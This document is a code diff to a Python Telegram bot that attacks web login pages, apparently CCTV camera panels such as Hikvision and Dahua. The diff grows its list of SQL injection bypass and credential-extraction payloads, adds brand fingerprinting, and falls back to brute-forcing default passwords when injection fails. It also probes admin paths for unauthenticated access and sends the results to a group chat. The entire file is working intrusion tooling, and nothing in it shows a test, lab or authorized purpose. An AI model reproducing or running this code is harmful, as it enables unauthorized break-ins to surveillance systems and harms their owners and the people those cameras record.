@@ -10,6 +10,7 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 from aiohttp import ClientSession, ClientTimeout
 from aiohttp.web import Application as WebApp, Response, run_app
+from bs4 import BeautifulSoup
 
 # Setup logging
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
@@ -85,7 +86,7 @@ PASSWORDS = [
     "1234", "adminadmin", "root", "toor", "pass", "test", "qwerty", "letmein"
 ]
 
-# SQL injection payloads (advanced, 70+)
+# SQL injection payloads (advanced, 80+)
 SQL_PAYLOADS = [
     # Basic bypass
     "' OR '1'='1", "admin' --", "admin' #", "' OR ''='", "admin' OR '1'='1",
@@ -93,7 +94,6 @@ SQL_PAYLOADS = [
     "1' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "admin' OR 'a'='a",
     "' OR '1'='1'/*", "admin'/*", "admin'*/", "' OR 1=1/*", "admin' OR 1=1/*",
     "') OR '1'='1", "' OR '1'='1' OR ''='", "admin' OR ''='", "' OR 1=1 LIMIT 1--",
-    # Advanced bypass
     "' OR 1=1 AND 1=1--", "admin' AND 1=2--", "' OR 1=1 ORDER BY 1--",
     "') OR ('1'='1')--", "' OR '1'='1' AND 'a'='a--", "admin' OR 1=1 LIMIT 1 OFFSET 0--",
     # Blind/time-based
@@ -101,7 +101,8 @@ SQL_PAYLOADS = [
     "' OR (SELECT SLEEP(3))--", "' OR 1=1 AND (SELECT SLEEP(3) FROM dual)--",
     "' OR BENCHMARK(2000000,MD5(1))--", "admin' OR SLEEP(3) AND '1'='1--",
     "' OR 1=1 AND SLEEP(3) LIMIT 1--", "' OR IF((SELECT 1)=1,SLEEP(3),0)--",
-    # Union-based (credential extraction)
+    "' OR 1=1 AND IF(1=1,SLEEP(3),0)--", "' OR SLEEP(3) AND '1'='1'--",
+    # Union-based
     "' UNION SELECT NULL, NULL--", "' UNION SELECT 1, 2--",
     "' UNION SELECT username, password FROM users--",
     "' UNION SELECT 1, concat(username, ':', password) FROM users--",
@@ -116,13 +117,16 @@ SQL_PAYLOADS = [
     "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
     "' OR 1=1 AND (SELECT 1/0 FROM dual)--",
     "' OR 1=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
+    "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
     # Stacked queries
     "'; SELECT 1--", "'; SELECT SLEEP(3)--", "admin'; SELECT username FROM users--",
     "'; INSERT INTO users (username, password) VALUES ('test', 'test')--",
-    # CCTV-specific (Hikvision, Dahua, etc.)
+    # CCTV-specific
     "' OR 'admin'='admin'--", "admin' OR 'root'='root'--", "' OR 'guest'='guest'--",
     "' OR '1'='1' AND user='admin'--", "admin' OR user='admin'--",
-    "' OR '1'='1' AND username='admin'--", "admin' OR username='admin'--"
+    "' OR '1'='1' AND username='admin'--", "admin' OR username='admin'--",
+    "' OR '1'='1' AND login='admin'--", "admin' OR login='admin'--",
+    "admin' AND 1=1--", "' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--"
 ]
 
 async def check_access(user_id: str) -> bool:
@@ -231,53 +235,77 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
     if context.user_data.get("progress_message_id"):
         try:
-            await update.message.delete(context.user_data["progress_message_id"])
+            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=context.user_data["progress_message_id"])
         except:
             pass
     await update.message.reply_text("Operation cancelled.")
 
-async def get_form_fields(url: str, session: ClientSession) -> Tuple[Optional[str], Optional[str], Dict]:
+async def get_form_fields(url: str, session: ClientSession) -> Tuple[Optional[str], Optional[str], Dict, Optional[str]]:
     try:
         async with session.get(url, ssl=False, timeout=5) as response:
             html = await response.text()
-            form_match = re.search(r'<form.*?>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
-            if not form_match:
+            soup = BeautifulSoup(html, "html.parser")
+            
+            # Extract company name
+            company = "Unknown"
+            title = soup.title.string if soup.title else ""
+            meta = soup.find("meta", {"name": ["description", "author", "generator"]})
+            meta_content = meta.get("content", "") if meta else ""
+            for source in [title, meta_content, html]:
+                for brand in ["Hikvision", "Dahua", "Axis", "Bosch", "Vivotek", "Generic CCTV"]:
+                    if brand.lower() in source.lower():
+                        company = brand
+                        break
+                if company != "Unknown":
+                    break
+            
+            # Find form
+            form = soup.find("form")
+            if not form:
                 logger.error("No form found in page")
-                return None, None, {}
-            inputs = re.findall(r'<input.*?name=["\'](.*?)["\'].*?(?:value=["\'](.*?)["\'])?', form_match.group(1), re.IGNORECASE)
-            form_data = {name: value or "" for name, value in inputs}
-            username_field = next((name for name in form_data if name.lower() in ["username", "user", "login", "email", "name", "loginid", "userid"]), None)
-            password_field = next((name for name in form_data if name.lower() in ["password", "pass", "pwd", "passwd"]), None)
-            return username_field, password_field, form_data
+                return None, None, {}, company
+            
+            # Extract all inputs
+            inputs = form.find_all("input")
+            form_data = {inp.get("name"): inp.get("value", "") for inp in inputs if inp.get("name")}
+            username_field = next((name for name in form_data if name.lower() in [
+                "username", "user", "login", "email", "name", "loginid", "userid", "user_id"
+            ]), None)
+            password_field = next((name for name in form_data if name.lower() in [
+                "password", "pass", "pwd", "passwd", "passcode"
+            ]), None)
+            
+            return username_field, password_field, form_data, company
     except Exception as e:
         logger.error(f"Error parsing form: {e}")
-        return None, None, {}
+        return None, None, {}, "Unknown"
 
 async def check_success(response, html: str, session: ClientSession) -> bool:
     try:
-        if response.status == 200 or response.status == 302:
+        if response.status in [200, 302]:
+            soup = BeautifulSoup(html, "html.parser")
             # Check for no login form
-            if not re.search(r'login|sign in|invalid|error|unauthorized', html, re.IGNORECASE):
+            if not soup.find("form") or not re.search(r'login|sign in|invalid|error|unauthorized', html, re.IGNORECASE):
                 return True
             # Check for dashboard keywords
-            if re.search(r'dashboard|welcome|control panel|admin|settings|manage', html, re.IGNORECASE):
+            if re.search(r'dashboard|welcome|control panel|admin|settings|manage|overview', html, re.IGNORECASE):
                 return True
             # Check redirect to protected path
-            if response.url.path in ["/dashboard", "/admin", "/home", "/panel", "/settings", "/manage", "/control"]:
+            if response.url.path in ["/dashboard", "/admin", "/home", "/panel", "/settings", "/manage", "/control", "/main"]:
                 return True
             # Check for session cookies
-            if response.cookies.get("session") or response.cookies.get("auth") or response.cookies.get("PHPSESSID"):
+            if any(cookie in response.cookies for cookie in ["session", "auth", "PHPSESSID", "JSESSIONID"]):
                 return True
             # Check JSON response
             if response.content_type == "application/json":
                 json_data = await response.json()
-                if json_data.get("success") or json_data.get("authenticated") or json_data.get("status") == "ok":
+                if any(key in json_data for key in ["success", "authenticated", "status"]) and json_data.get(key, False):
                     return True
-            # Follow redirect and check
+            # Follow redirect
             if response.status == 302 and response.headers.get("Location"):
                 async with session.get(response.headers["Location"], ssl=False, timeout=5) as redirect_response:
                     redirect_html = await redirect_response.text()
-                    if re.search(r'dashboard|admin|settings|manage', redirect_html, re.IGNORECASE):
+                    if re.search(r'dashboard|admin|settings|manage|overview', redirect_html, re.IGNORECASE):
                         return True
     except Exception as e:
         logger.error(f"Error checking success: {e}")
@@ -285,10 +313,22 @@ async def check_success(response, html: str, session: ClientSession) -> bool:
 
 async def sql_injection(url: str, session: ClientSession, update: Update, context: ContextTypes.DEFAULT_TYPE) -> list:
     results = []
-    username_field, password_field, form_data = await get_form_fields(url, session)
-    if not username_field or not password_field:
-        return ["❌ No login form found or invalid fields. Ensure URL points to a login page."]
+    username_field, password_field, form_data, company = await get_form_fields(url, session)
     
+    # Report detection status
+    if not username_field or not password_field:
+        detection_message = f"❌ No login form detected at {url}. Company: {company}"
+        await update.message.reply_text(detection_message)
+        if GROUP_CHAT_ID:
+            await context.bot.send_message(GROUP_CHAT_ID, detection_message)
+        return [detection_message]
+    
+    detection_message = f"✅ Login panel detected at {url}. Company: {company}"
+    await update.message.reply_text(detection_message)
+    if GROUP_CHAT_ID:
+        await context.bot.send_message(GROUP_CHAT_ID, detection_message)
+    
+    # Start SQL injection
     total_payloads = len(SQL_PAYLOADS)
     progress_message = await update.message.reply_text(
         f"🔄 Starting SQL Injection on {url}\nProgress: 0/{total_payloads} payloads",
@@ -312,7 +352,7 @@ async def sql_injection(url: str, session: ClientSession, update: Update, contex
                 cred_match = re.search(r'username:.*?(\w+).*?password:.*?(\w+)', html, re.IGNORECASE)
                 if cred_match:
                     results.append(f"✅ Credentials Found: Username: {cred_match.group(1)}, Password: {cred_match.group(2)}")
-                await asyncio.sleep(0.5)  # Stricter rate limiting
+                await asyncio.sleep(0.6)  # Stricter rate limiting
             if i % 5 == 0 or i == total_payloads:
                 try:
                     await context.bot.edit_message_text(
@@ -327,6 +367,16 @@ async def sql_injection(url: str, session: ClientSession, update: Update, contex
             logger.error(f"SQL injection error on payload {payload}: {e}")
             continue
     
+    # Fallback to brute force if SQL fails
+    if not results:
+        await context.bot.edit_message_text(
+            chat_id=update.effective_chat.id,
+            message_id=progress_message.message_id,
+            text=f"🔄 SQL Injection failed. Trying Brute Force on {url}\nProgress: 0/{len(USERNAMES) * len(PASSWORDS)} combinations",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
+        )
+        results = await brute_force(url, session, update, context, form_data, username_field, password_field)
+    
     # Clean up progress message
     try:
         await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=progress_message.message_id)
@@ -336,19 +386,9 @@ async def sql_injection(url: str, session: ClientSession, update: Update, contex
     
     return results or ["❌ No bypass found. Try a different URL or check form fields."]
 
-async def brute_force(url: str, session: ClientSession, update: Update, context: ContextTypes.DEFAULT_TYPE) -> list:
+async def brute_force(url: str, session: ClientSession, update: Update, context: ContextTypes.DEFAULT_TYPE, form_data: Dict, username_field: str, password_field: str) -> list:
     results = []
-    username_field, password_field, form_data = await get_form_fields(url, session)
-    if not username_field or not password_field:
-        return ["❌ No login form found or invalid fields."]
-    
     total_combinations = len(USERNAMES) * len(PASSWORDS)
-    progress_message = await update.message.reply_text(
-        f"🔄 Starting Brute Force on {url}\nProgress: 0/{total_combinations} combinations",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_brute")]])
-    )
-    context.user_data["progress_message_id"] = progress_message.message_id
-
     count = 0
     for username in USERNAMES:
         for password in PASSWORDS:
@@ -364,28 +404,21 @@ async def brute_force(url: str, session: ClientSession, update: Update, context:
                         results.append(f"✅ Cracked! Username: {username}, Password: {password}\n[🌐 Visit {direct_url}]")
                         logger.info(f"Brute force success: {username}:{password}")
                         return results
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(0.6)
                 if count % 5 == 0 or count == total_combinations:
                     try:
                         await context.bot.edit_message_text(
                             chat_id=update.effective_chat.id,
-                            message_id=progress_message.message_id,
+                            message_id=context.user_data["progress_message_id"],
                             text=f"🔄 Brute Force on {url}\nProgress: {count}/{total_combinations} combinations",
-                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_brute")]])
+                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
                         )
                     except Exception as e:
                         logger.error(f"Error updating progress: {e}")
             except Exception as e:
                 logger.error(f"Brute force error: {e}")
                 continue
-    
-    try:
-        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=progress_message.message_id)
-    except:
-        pass
-    context.user_data.pop("progress_message_id", None)
-    
-    return results or ["❌ No credentials found."]
+    return results or ["❌ No credentials found via brute force."]
 
 async def direct_check(base_url: str, session: ClientSession, update: Update, context: ContextTypes.DEFAULT_TYPE) -> list:
     results = []
@@ -405,7 +438,7 @@ async def direct_check(base_url: str, session: ClientSession, update: Update, co
                     if re.search(r'dashboard|admin|control panel|settings|manage', html, re.IGNORECASE):
                         results.append(f"✅ Accessible without login: {full_url}\n[🌐 Visit {full_url}]")
                         logger.info(f"Direct access success: {full_url}")
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.6)
             if i % 5 == 0 or i == total_paths:
                 try:
                     await context.bot.edit_message_text(
@@ -457,7 +490,11 @@ async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if mode == "sql_injection":
                 results = await sql_injection(url, session, update, context)
             elif mode == "brute_force":
-                results = await brute_force(url, session, update, context)
+                username_field, password_field, form_data, company = await get_form_fields(url, session)
+                if not username_field or not password_field:
+                    results = [f"❌ No login form detected at {url}. Company: {company}"]
+                else:
+                    results = await brute_force(url, session, update, context, form_data, username_field, password_field)
             else:  # direct_check
                 results = await direct_check(url, session, update, context)
             result_text = "\n".join(results)
